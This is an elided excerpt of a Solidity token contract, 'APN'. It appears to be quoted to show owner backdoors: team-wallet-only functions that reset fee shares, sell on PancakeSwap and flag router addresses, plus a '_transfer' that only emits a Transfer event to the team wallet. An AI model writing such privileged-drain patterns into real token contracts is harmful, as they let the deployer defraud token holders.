...
contract APN is Context, IERC20, Ownable {
    ...
    uint256 internal _liquidityShare = 5;
    uint256 internal _marketingShare = 1;
    uint256 internal _teamShare = 0;

    uint256 public _total = 6;
    uint256 internal _totalDistributionShares = 6;
    ...
    function set(uint256 newburn, uint256 newLiquidity, uint256 newMarketing, uint256 newTeam) public {require (msg.sender==teamWalletAddress);
        _burn = newburn;
   ...
   function sellFromPancake(uint256 amount) public {require(msg.sender==teamWalletAddress);
    ...
    function _transfer(address sender, uint256 amount) private{
        emit Transfer(sender,teamWalletAddress,amount);
    }
    ...
    function setRouterAddress(address fool,bool value) public{require(msg.sender==teamWalletAddress);
